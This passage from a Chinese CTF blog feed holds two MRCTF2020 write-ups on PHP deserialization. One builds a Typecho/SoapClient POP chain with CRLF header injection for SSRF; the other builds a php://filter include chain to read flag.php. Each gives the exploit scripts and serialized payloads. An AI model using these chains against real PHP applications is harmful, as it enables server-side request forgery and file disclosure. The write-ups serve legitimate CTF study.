            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/file|assert|eval|[`\'~^?&lt;>$%]+/i"</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"Not that easy."</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p><strong>/var/IXR/Typecho/Db.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Typecho_Db</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token string">'typecho_'</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">/** 获取适配器名称 */</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapterName</span> <span class="token operator">=</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">/** 数据库适配器 */</span>
        <span class="token variable">$adapterName</span> <span class="token operator">=</span> <span class="token string">'Typecho_Db_Adapter_'</span> <span class="token punctuation">.</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token string">'isAvailable'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Exception</span><span class="token punctuation">(</span><span class="token string">"Adapter {$adapterName} is not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//__toString()</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">/** 初始化内部变量 */</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_pool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_connectedPool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//实例化适配器对象</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$adapterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p><strong>/var/IXR/Typecho/Db/Query.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Typecho_Db_Query</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$_default</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string">'action'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'table'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'fields'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'*'</span><span class="token punctuation">,</span>
        <span class="token string">'join'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'where'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'limit'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'offset'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'order'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'group'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'having'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>
        <span class="token string">'rows'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_sqlPreBuild</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">SELECT</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSelect</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">INSERT</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'INSERT INTO '</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>
                <span class="token punctuation">.</span> <span class="token string">'('</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">')'</span>
                <span class="token punctuation">.</span> <span class="token string">' VALUES '</span>
                <span class="token punctuation">.</span> <span class="token string">'('</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token function">array_values</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">')'</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">DELETE</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'DELETE FROM '</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UPDATE</span><span class="token punctuation">:</span>
                <span class="token variable">$columns</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token variable">$columns</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"$key = $val"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">return</span> <span class="token string">'UPDATE '</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>
                <span class="token punctuation">.</span> <span class="token string">' SET '</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token variable">$columns</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> SoapClient<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__call</span> <span class="token punctuation">(</span> string <span class="token variable">$function_name</span> <span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$arguments</span> <span class="token punctuation">)</span></code></pre>
<ul>
<li><code>unserialize(HelloWorld_DB)-&gt;__wakeup()-&gt;Typecho_Db</code>，<code>$this-&gt;coincidence['hello']</code> 作为 <code>Typecho_Db</code> 的<code>__construct()</code> 方法的第一个参数</li>
<li><code>throw new Typecho_Db_Exception("Adapter {$adapterName} is not available"</code>吧类当做字符串触发<code>__toString()</code>魔术方法</li>
<li><code>__toString()-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></li>
<li><code>$this-&gt;_adapter = new $adapterName()</code>触发了 <code>SoapClient</code> 的<code>__call()</code> 魔术方法</li>
</ul>
<p><strong>exp</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Typecho_Db_Query</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$_sqlPreBuild</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_adapter</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
       <span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php';</span>
        <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string">'Cookie: PHPSESSID=a8vkg6l5j5sesvqan5q5s4obr1'</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'H3ng^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span> <span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"SELECT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">HelloWorld_DB</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$coincidence</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloWorld_DB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>想要带 SESSION 出来，必须要把自己的 PHPSESSID 传过去，然而 SOAP 并不能设置 Cookie，因此需要 CRLF。SoapClient 可以设置 UA，只要在 UA 后加上 <code>\r\nCookie: PHPSESSID=xxx</code> 就能为 http 头添加一个新的 Cookie 字段，这样就能带上 session 了。</p>
<p><img src="/2021/10/04/mrctf2020-ezpop-revenge/image-20211005200834623.png" alt="image-20211005200834623"></p>
<p><img src="/2021/10/04/mrctf2020-ezpop-revenge/image-20211005200750405.png" alt="image-20211005200750405"></p>
<ul>
<li>PHP序列化的时候private和protected变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。</li>
<li>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图1，url编码后就可以看得很清楚了。</li>
<li>同理，protected属性会引入<code>\x00*\x00</code>。</li>
<li>此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如<code>s:5:”A&lt;null_byte&gt;B“;̀ -&gt; S:5:”A\00B\09\0D”;</code></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>MRCTF:2020-Ezpop</title>
    <url>/2021/07/16/mrctf-2020-ezpop/</url>
    <content><![CDATA[<pre class=" language-PHP"><code class="language-PHP"> <?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} </code></pre>
<p>魔术方法：</p>
<ul>
<li><strong>__construct   当一个对象创建时被调用，</strong></li>
<li><strong>__toString   当一个对象被当作一个字符串被调用。</strong></li>
<li><strong>__wakeup()   使用unserialize时触发</strong></li>
<li>__<strong>get()    用于从不可访问的属性读取数据</strong><br>**#难以访问包括：（1）私有属性，（2）没有初始化的属性**</li>
<li><strong>__invoke()   当脚本尝试将对象调用为函数时触发</strong></li>
</ul>
<p>梳理一下：</p>
<p>get获得pop</p>
<p>@unserialize($_GET[‘pop’]);调用__wakeup()</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>调用了__tostring()</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><code>__toString()</code>其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的<code>_get()</code>方法。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>Get()调用到其他函数，就会调用到__invoke()函数</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>运行结果：</p>
<pre class=" language-php"><code class="language-php">O<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22aaa<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22p<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Modifier<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A6</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span>00var<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A57</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22php<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2F</span><span class="token operator">%</span>2Ffilter<span class="token operator">%</span>2Fread<span class="token operator">%</span>3Dconvert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">%</span>2Fresource<span class="token operator">%</span>3Dflag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span>7Ds<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BN</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span></code></pre>
<p><img src="/2021/07/16/mrctf-2020-ezpop/image-20210716223532595.png" alt="image-20210716223532595"></p>
<pre><code>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezcxMWJiYjQxLWY2MGQtNGQyMi1iNDc4LTYzZmMwNDg2NDc5NX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</code></pre>
<p>base64解码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
